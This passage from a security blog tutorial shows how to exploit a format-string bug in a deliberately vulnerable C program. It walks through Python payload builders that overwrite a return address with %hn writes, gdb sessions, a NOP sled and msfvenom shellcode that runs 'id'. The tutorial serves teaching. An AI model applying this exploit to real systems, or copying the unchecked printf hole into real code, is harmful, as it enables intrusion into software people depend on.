</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str( (<span style="color:#ae81ff">0x5655</span> <span style="color:#f92672">-</span> len(payload)) )<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;p&#34;</span> 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%5$hn&#34;</span> <span style="color:#75715e"># pass the high order address as a parameter to printf</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str( (<span style="color:#ae81ff">0x61cd</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x5655</span> <span style="color:#f92672">-</span> len(payload)) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span> )<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;p&#34;</span> 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%4$hn&#34;</span> <span style="color:#75715e"># pass the low order address as a parameter to printf</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;exploit.txt&#34;</span>, <span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload)
</span></span></code></pre></div><p>Let&rsquo;s try it.</p>
<center><img src="/imgs/successfully_pwned.png" width="437"/></center>
<p><strong>BINGO</strong>, Finally, we could successfully overwrite the instruction pointer and redirecting the execution flow to call the <code>pwnme</code> function.</p>
<h3 id="executing-arbitrary-code">Executing arbitrary code</h3>
<p>Since we can manipulate and redirect the program&rsquo;s execution flow, we can also inject our own code and force the program to execute it. Let&rsquo;s remove the <code>pwnme</code> function from the vulnerable sample:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> cStrFmt[<span style="color:#ae81ff">8192</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>( cStrFmt, <span style="color:#66d9ef">sizeof</span>(cStrFmt), stdin );
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>( cStrFmt );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vulnerable</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>And recompile that code as follows:</p>
<pre tabindex="0"><code>┌──(abdallah㉿pc)-[~]
└─$ gcc -m32 -pie -z execstack test.c -o test

┌──(abdallah㉿pc)-[~]
└─$ echo &#34;Hello World!&#34; | ./test
Hello World!
</code></pre><p>Our plan is to inject our malicious code into the stack and then forge the return address to point to the malicious code address in order to make the CPU execute it. We have learned how to manipulate and overwrite anything in the memory, so I will do that quickly.</p>
<pre tabindex="0"><code>┌──(abdallah㉿pc)-[~]
└─$ gdb -nx -q ./test
Reading symbols from ./test...
(No debugging symbols found in ./test)
(gdb) b vulnerable 
Breakpoint 1 at 0x11b1
(gdb) r &lt; exploit.txt
Starting program: /home/abdallah/test &lt; exploit.txt

Breakpoint 1, 0x565561b1 in vulnerable ()
(gdb) p $ebp+4
$1 = (void *) 0xffffd14c
(gdb) p $ebp-8192
$2 = (void *) 0xffffb148
</code></pre><p>The function&rsquo;s return address is live at <code>0xffffd14c</code>. And we will inject our shellcode at <code>0xffffb148</code>. I don&rsquo;t care about the accuracy of offsets because I will pad my shellcode by many NOP instructions, all we need to do is make sure that we are still inside the function&rsquo;s stack frame, that&rsquo;s why I write the shellcode at <code>$ebp-8192</code> because the frame size needs to be larger because 8192 is the size of the format buffer within this frame. Let&rsquo;s prepare our exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Py" data-lang="Py"><span style="display:flex;"><span><span style="color:#75715e"># Author     ==&gt; Abdallah Mohamed (0xNinjaCyclone)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0xffffd14c &lt;== target (return address pointer)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0xffffb148 &lt;== shellcode address</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4c\xd1\xff\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># return address in little endian format (low order)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4e\xd1\xff\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># return address in little endian format (low order)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str( (<span style="color:#ae81ff">0xb148</span> <span style="color:#f92672">-</span> len(payload)) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span> )<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;p&#34;</span> 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%4$hn&#34;</span> <span style="color:#75715e"># pass the low order address as a parameter to printf</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str( (<span style="color:#ae81ff">0xffff</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xb148</span> <span style="color:#f92672">-</span> len(payload)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xec</span> )<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;p&#34;</span> 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%5$hn&#34;</span> <span style="color:#75715e"># pass the low order address as a parameter to printf</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x400</span> <span style="color:#75715e"># NOP Instructions</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdb\xdd\xd9\x74\x24\xf4\xb8\x0e\x28\x82\x71\x5f\x31</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc9\xb1\x0c\x31\x47\x18\x03\x47\x18\x83\xef\xf2\xca</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x77\x1b\x01\x53\xe1\x8e\x73\x0b\x3c\x4c\xf2\x2c\x56</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbd\x77\xdb\xa7\xa9\x58\x79\xc1\x47\x2f\x9e\x43\x70</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c\x61\x64\x80\x5b\x05\x64\xd7\xc8\x4c\x85\x1a\x6e</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f\x9d\xcf\x6f\xd8\xec\x90</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;exploit.txt&#34;</span>, <span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload)
</span></span></code></pre></div><p>The shellcode I use is generated by msfvenom as follows:</p>
<pre tabindex="0"><code>┌──(abdallah㉿pc)-[~]
└─$ msfvenom -a x86 --platform linux -p linux/x86/exec -f python -b &#34;\x00&#34; CMD=&#34;id&#34; AppendExit=true
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 72 (iteration=0)
x86/shikata_ga_nai chosen with final size 72
Payload size: 72 bytes
Final size of python file: 365 bytes
buf =  b&#34;&#34;
buf += b&#34;\xdb\xdd\xd9\x74\x24\xf4\xb8\x0e\x28\x82\x71\x5f\x31&#34;
buf += b&#34;\xc9\xb1\x0c\x31\x47\x18\x03\x47\x18\x83\xef\xf2\xca&#34;
buf += b&#34;\x77\x1b\x01\x53\xe1\x8e\x73\x0b\x3c\x4c\xf2\x2c\x56&#34;
buf += b&#34;\xbd\x77\xdb\xa7\xa9\x58\x79\xc1\x47\x2f\x9e\x43\x70&#34;
buf += b&#34;\x2c\x61\x64\x80\x5b\x05\x64\xd7\xc8\x4c\x85\x1a\x6e&#34;
buf += b&#34;\x7f\x9d\xcf\x6f\xd8\xec\x90&#34;
</code></pre><p>The exploit injects the malicious format that hijacks the execution flow at the head of the payload. Then, it sprays the stack with NOP instructions (No Operation) so we can jump on any addresses at that range without being restricted to a specific address. Furthermore, the stack layout may look different between the gdb environment and the real environment for several reasons such as additional env variables. You may notice that the gdb is running the program with the full path which may not be the case in the real scenario. All these considerations need a stable solution.</p>
<p>The exploit overwrites the instruction pointer with <code>0xffffb148 + 0x100</code> to ensure that in all cases we are within the correct range. When the program jumps to that address, it will find NOP instructions followed by our malicious code.</p>
<pre tabindex="0"><code>Breakpoint 2, 0x565561f9 in vulnerable ()
(gdb) si
0xffffb248 in ?? ()
(gdb) x/20i 0xffffb248
=&gt; 0xffffb248:	nop
   0xffffb249:	nop
   0xffffb24a:	nop
   0xffffb24b:	nop
   0xffffb24c:	nop
   0xffffb24d:	nop
   0xffffb24e:	nop
   0xffffb24f:	nop
   0xffffb250:	nop
   0xffffb251:	nop
   0xffffb252:	nop
   0xffffb253:	nop
   0xffffb254:	nop
   0xffffb255:	nop
   0xffffb256:	nop
   0xffffb257:	nop
   0xffffb258:	nop
   0xffffb259:	nop
   0xffffb25a:	nop
   0xffffb25b:	nop
</code></pre><p>The CPU will keep executing all those NOPs until find the shellcode, once found it will execute it and the program will be terminated by the shellcode.</p>
<center><img src="/imgs/exec_shell.png" width="512"/></center>
<h2 id="conclusion">Conclusion</h2>
<p>At the end of the article, I would like to advise you to practice what you have learned with your own hands and not just read. You must face problems and try to solve them yourself, search and ask those who are more experienced than you. In this way, your level will improve and your skills will increase. Do not forget that practice is the key. If you enjoyed the article, do not forget to share it. Thank you for reading. See you later in a new article.</p>
</div>
    </article>
  </main>

      </div>
      <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      <br />
      
        
        <a href="https://github.com/0xNinjaCyclone">GitHub</a>
      
         | 
        <a href="https://twitter.com/0xNinjaCyclone">Twitter</a>
      
         | 
        <a href="https://www.facebook.com/abdallah.elsharif07">Facebook</a>
      
    </p>
  
</footer>

    </div>
  </body>
</html>
